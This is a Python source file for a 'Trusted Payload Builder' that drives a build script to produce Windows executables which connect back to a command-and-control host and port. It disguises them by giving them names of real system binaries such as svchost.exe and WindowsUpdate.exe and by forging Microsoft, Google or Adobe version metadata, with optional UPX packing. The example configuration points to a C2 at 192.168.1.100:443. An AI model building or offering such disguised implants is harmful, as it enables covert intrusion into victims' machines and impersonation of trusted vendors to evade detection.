#!/usr/bin/env python3
"""
Trusted Payload Builder
Generates Windows payloads with legitimate appearance for security research
"""

import os
import subprocess
import hashlib
import time
from pathlib import Path

class TrustedPayloadBuilder:
    """Build Windows payloads with legitimate metadata and appearance"""
    
    LEGITIMATE_NAMES = [
        "WindowsUpdate.exe",
        "svchost.exe",
        "RuntimeBroker.exe",
        "SecurityHealthSystray.exe",
        "OneDrive.exe",
        "MicrosoftEdgeUpdate.exe",
        "GoogleUpdate.exe",
        "AdobeARM.exe",
        "OfficeClickToRun.exe",
        "SystemSettings.exe",
        "backgroundTaskHost.exe"
    ]
    
    METADATA_TEMPLATES = {
        'microsoft': {
            'company': 'Microsoft Corporation',
            'description': 'Windows System Update Service',
            'product': 'Microsoft® Windows® Operating System',
            'copyright': '© Microsoft Corporation. All rights reserved.'
        },
        'google': {
            'company': 'Google LLC',
            'description': 'Google Update Service',
            'product': 'Google Update',
            'copyright': '© Google LLC. All rights reserved.'
        },
        'adobe': {
            'company': 'Adobe Inc.',
            'description': 'Adobe Updater Service',
            'product': 'Adobe Creative Cloud',
            'copyright': '© Adobe Inc. All rights reserved.'
        },
        'generic': {
            'company': 'System Services Corporation',
            'description': 'Background System Service',
            'product': 'System Maintenance Tools',
            'copyright': '© System Services Corporation. All rights reserved.'
        }
    }
    
    def __init__(self, workspace='/workspace/native_payloads'):
        self.workspace = Path(workspace)
        self.build_script = self.workspace / 'build_trusted_windows.sh'
        
    def build_trusted_payload(self, config):
        """
        Build a trusted-looking Windows payload
        
        Args:
            config (dict): Configuration with keys:
                - c2_host: C2 server host
                - c2_port: C2 server port
                - filename: Output filename (optional)
                - metadata_style: 'microsoft', 'google', 'adobe', 'generic'
                - use_upx: Compress with UPX (optional)
                - custom_metadata: Custom metadata dict (optional)
        
        Returns:
            dict: Result with success status, path, hash, etc.
        """
        try:
            # Validate configuration
            c2_host = config.get('c2_host', '127.0.0.1')
            c2_port = config.get('c2_port', 4433)
            
            # Choose filename
            if config.get('filename'):
                filename = config['filename']
                if not filename.endswith('.exe'):
                    filename += '.exe'
            else:
                import random
                filename = random.choice(self.LEGITIMATE_NAMES)
            
            # Get metadata style
            metadata_style = config.get('metadata_style', 'microsoft')
            if metadata_style not in self.METADATA_TEMPLATES:
                metadata_style = 'generic'
            
            # Update resource file with custom metadata if provided
            if config.get('custom_metadata') or metadata_style != 'microsoft':
                self._update_resource_file(
                    config.get('custom_metadata') or self.METADATA_TEMPLATES[metadata_style]
                )
            
            # Prepare environment variables for build script
            env = os.environ.copy()
            env['C2_HOST'] = str(c2_host)
            env['C2_PORT'] = str(c2_port)
            env['PAYLOAD_NAME'] = filename
            
            if config.get('use_upx'):
                env['USE_UPX'] = 'yes'
            
            # Check if build script exists
            if not self.build_script.exists():
                return {
                    'success': False,
                    'error': 'Build script not found. Please ensure build_trusted_windows.sh exists.'
                }
            
            # Execute build script
            result = subprocess.run(
                ['bash', str(self.build_script)],
                cwd=str(self.workspace),
                env=env,
                capture_output=True,
                text=True,
                timeout=300  # 5 minute timeout
            )
            
            if result.returncode != 0:
                return {
                    'success': False,
                    'error': f'Build failed: {result.stderr}',
                    'stdout': result.stdout,
                    'stderr': result.stderr
                }
            
            # Check if output file exists
            output_path = self.workspace / 'output' / filename
            if not output_path.exists():
                return {
                    'success': False,
                    'error': 'Build completed but output file not found'
                }
            
            # Calculate hash
            file_hash = self._calculate_hash(output_path)
            file_size = output_path.stat().st_size
            
            return {
                'success': True,
                'path': str(output_path),
                'filename': filename,
                'size': file_size,
                'size_human': self._format_size(file_size),
                'hash': file_hash,
                'metadata_style': metadata_style,
                'c2_host': c2_host,
                'c2_port': c2_port,
                'compressed': config.get('use_upx', False),
                'message': f'Trusted payload built successfully: {filename}'
            }
            
        except subprocess.TimeoutExpired:
            return {
                'success': False,
                'error': 'Build timeout (exceeded 5 minutes)'
            }
        except Exception as e:
            return {
                'success': False,
                'error': f'Build error: {str(e)}'
            }
    
    def _update_resource_file(self, metadata):
        """Update resource.rc file with custom metadata"""
        resource_file = self.workspace / 'windows' / 'resource.rc'
        
        if not resource_file.exists():
            return
        
        try:
            with open(resource_file, 'r') as f:
                content = f.read()
            
            # Replace metadata values
            replacements = {
                'CompanyName': metadata.get('company', 'Microsoft Corporation'),
                'FileDescription': metadata.get('description', 'Windows System Update Service'),
                'ProductName': metadata.get('product', 'Microsoft® Windows® Operating System'),
                'LegalCopyright': metadata.get('copyright', '© Microsoft Corporation. All rights reserved.')
            }
            
            for key, value in replacements.items():
                # Find and replace VALUE lines
                import re
                pattern = rf'VALUE "{key}", "[^"]*"'
                replacement = f'VALUE "{key}", "{value}\\0"'
                content = re.sub(pattern, replacement, content)
            
            with open(resource_file, 'w') as f:
                f.write(content)
                
        except Exception as e:
            print(f"Warning: Could not update resource file: {e}")
    
    def _calculate_hash(self, filepath):
        """Calculate SHA256 hash of file"""
        sha256 = hashlib.sha256()
        with open(filepath, 'rb') as f:
            for chunk in iter(lambda: f.read(4096), b''):
                sha256.update(chunk)
        return sha256.hexdigest()
    
    def _format_size(self, size_bytes):
        """Format file size in human-readable format"""
        for unit in ['B', 'KB', 'MB', 'GB']:
            if size_bytes < 1024.0:
                return f"{size_bytes:.2f} {unit}"
            size_bytes /= 1024.0
        return f"{size_bytes:.2f} TB"
    
    def list_legitimate_names(self):
        """Return list of legitimate-looking filenames"""
        return self.LEGITIMATE_NAMES.copy()
    
    def list_metadata_styles(self):
        """Return available metadata styles"""
        return list(self.METADATA_TEMPLATES.keys())
    
    def get_metadata_preview(self, style):
        """Get preview of metadata for a style"""
        return self.METADATA_TEMPLATES.get(style, self.METADATA_TEMPLATES['generic']).copy()


# Global instance
trusted_builder = TrustedPayloadBuilder()


if __name__ == '__main__':
    # Test the builder
    print("Testing Trusted Payload Builder...")
    print(f"Available names: {trusted_builder.list_legitimate_names()}")
    print(f"Available styles: {trusted_builder.list_metadata_styles()}")
    
    # Example build
    config = {
        'c2_host': '192.168.1.100',
        'c2_port': 443,
        'filename': 'WindowsUpdate.exe',
        'metadata_style': 'microsoft',
        'use_upx': False
    }
    
    print(f"\nExample build configuration:")
    for key, value in config.items():
        print(f"  {key}: {value}")
